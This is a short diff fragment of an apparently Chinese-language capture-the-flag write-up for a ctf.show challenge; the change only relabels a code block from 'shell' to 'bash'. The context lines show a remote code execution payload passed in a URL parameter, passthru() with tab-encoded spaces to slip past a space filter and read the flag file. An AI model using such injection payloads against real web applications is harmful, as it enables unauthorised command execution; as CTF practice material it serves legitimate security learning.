@@ -25,7 +25,7 @@ https://39bfaef5-681e-432f-9797-5d74465f2b7f.challenge.ctf.show/?c=passthru("ls%
 
 那剩下的就很容易了
 
-```shell
+```bash
 https://39bfaef5-681e-432f-9797-5d74465f2b7f.challenge.ctf.show/?c=passthru("head%09-n%0920%09fla*");
 
 head -n 20 fla*
